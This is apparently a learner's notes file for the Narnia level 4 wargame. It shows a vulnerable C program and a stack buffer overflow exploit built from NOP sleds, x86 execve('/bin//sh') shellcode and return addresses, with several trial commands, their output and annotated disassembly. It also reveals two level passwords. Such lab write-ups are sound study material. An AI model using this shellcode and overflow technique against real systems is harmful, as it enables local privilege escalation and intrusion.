@@ -1,0 +1,114 @@
+Previous key: thaenohtai
+
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <ctype.h>
+
+extern char **environ;
+
+int main(int argc,char **argv){
+	int i;
+	char buffer[256];
+
+	for(i = 0; environ[i] != NULL; i++)
+		memset(environ[i], '\0', strlen(environ[i]));
+
+	if(argc>1)
+		strcpy(buffer,argv[1]);
+
+	return 0;
+}
+
+From what I can tell, this is going to be:
+
+Buffer overflow at strcpy to change return address to the stack where I will have some shellcode.
+
+I seem to have to avoid a pipe. Maybe pipe output is stored in an environment variable?
+
+In some cases, when I toy with the number of nops, I get an open stdin and nothing out. **Note after the fact: I still don't know why this happens. Perhaps I was accidentally overwriting the return address with an instruction that would cause the program to hang.
+
+**Another note: I tried a bunch of different shellcodes and nop positions in gdb between these execution attempts but I was getting inconsistent errors which turned out to be a breakpoints issue. Below are a few things I tried.
+
+narnia4@melinda:/narnia$ ./narnia4 `python -c "print '\x90'*238+'\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80\x3c\xd5\xff\xff\x3c\xd5\xff\xff'"`
+whoami
+^C
+narnia4@melinda:/narnia$ ./narnia4 `python -c "print '\x90'*242+'\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80\x3c\xd5\xff\xff\x3c\xd5\xff\xff'"`
+Segmentation fault
+
+./narnia4 `python -c "print '\x90'*242+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"`
+
+narnia4@melinda:/narnia$ ./narnia4 `python -c "print '\x90'*244+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x1c\xd5\xff\xff\x1c\xd5\xff\xff'"`
+Segmentation fault
+narnia4@melinda:/narnia$ ./narnia4 `python -c "print '\x90'*246+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x1c\xd5\xff\xff\x1c\xd5\xff\xff'"`
+Segmentation fault
+narnia4@melinda:/narnia$ ./narnia4 `python -c "print '\x90'*245+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x1c\xd5\xff\xff\x1c\xd5\xff\xff'"`
+Illegal instruction
+
+`python -c "print '\x90'*245+'\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x1c\xd5\xff\xff'"`
+
+`python -c "print '\x90'*245+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'+'\x2c\xd5\xff\xff\x2c\xd5\xff\xff'"`
+
+For some reason, the return address was sliding around so I have it there twice.
+
+0xffffd5fe:	0x31909000	0x2f6850c0	0x6868732f	0x6e69622f
+
+Maybe it's cutting off because of the odd address number. Let me slide the instructions around. *This wasn't the problem.
+
+Now I'm getting an illegal instruction.
+
+Not sure what went wrong here but this shellcode from a previous challenge worked better.
+
+./narnia4 `python -c "print '\x90'*240 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x10\x3c\xd5\xff\x3c\xd5\xff\xff'"`
+
+faimahchiy
+
+I notice that the saved EBP used to be 0 and by overwriting it with the return address too (just to make it somewhere on the stack) I was able to prevent a read error.
+
+Actually, it's possible that either my shellcode was just plain wrong or I did notice an 0x00 on the stack in the middle of my buffer towards the end so that might have been it.
+
+Might have had something to do with an even number of nops? Probably not.
+
+I'm gonna look at some of the shellcodes I tried.
+
+This worked:
+ 8048060: 31 c0                 xor    %eax,%eax		//Zero eax
+ 8048062: 50                    push   %eax				//Push zero
+ 8048063: 68 2f 2f 73 68        push   $0x68732f2f		//Push "//sh"
+ 8048068: 68 2f 62 69 6e        push   $0x6e69622f		//Push "/bin"
+ 804806d: 89 e3                 mov    %esp,%ebx		//Put stack pointer in ebx
+ 804806f: 89 c1                 mov    %eax,%ecx		//Put eax in ecx
+ 8048071: 89 c2                 mov    %eax,%edx		//Put eax in edx
+ 8048073: b0 0b                 mov    $0xb,%al 		//Set eax to 0xb
+ 8048075: cd 80                 int    $0x80 			//Run call
+ 8048077: 31 c0                 xor    %eax,%eax 		//Zero eax
+ 8048079: 40                    inc    %eax				//Set it to one
+ 804807a: cd 80                 int    $0x80 			//Run call
+
+This did not:
+ xor    %eax,%eax										//Zero eax
+ push   %eax											//Push zero
+ push   $0x68732f2f										//Push "//sh"
+ push   $0x6e69622f										//Push "/bin"
+ mov    %esp,%ebx										//Put stack pointer in ebx
+ push   %eax											//Push eax
+ push   %ebx											//Push ebx
+ mov    %esp,%ecx										//Put stack pointer in ecx
+ mov    $0xb,%al 										//Set eax to 0xb
+ int    $0x80 											//Run call
+
+First thing I notice is that there are two int instructions in the working one. I'm going to try the shellcode the last two instructions removed and see if that works.
+
+That didn't work. I guess I needed to use something that would run an exit too.
+
+As I try and run the exploit again with the second shellcode I'm seeing a segmentation fault at push ebx
+
+I guess the issue was too many push operations in that case.
+
+Side note: Breakpoints on instructions in the stack modify the memory there and throw things off so put them in the nop slide.
+
+Now for the illegal instruction one:
+
+Same issue it seems.
+
+So I guess what went wrong there is I couldn't push all the parameters onto the stack and in gdb that meant a segfault but in actual execution it meant that nothing happened at int 0x80 so it went on to execute whatever it interpreted from the following stack data.
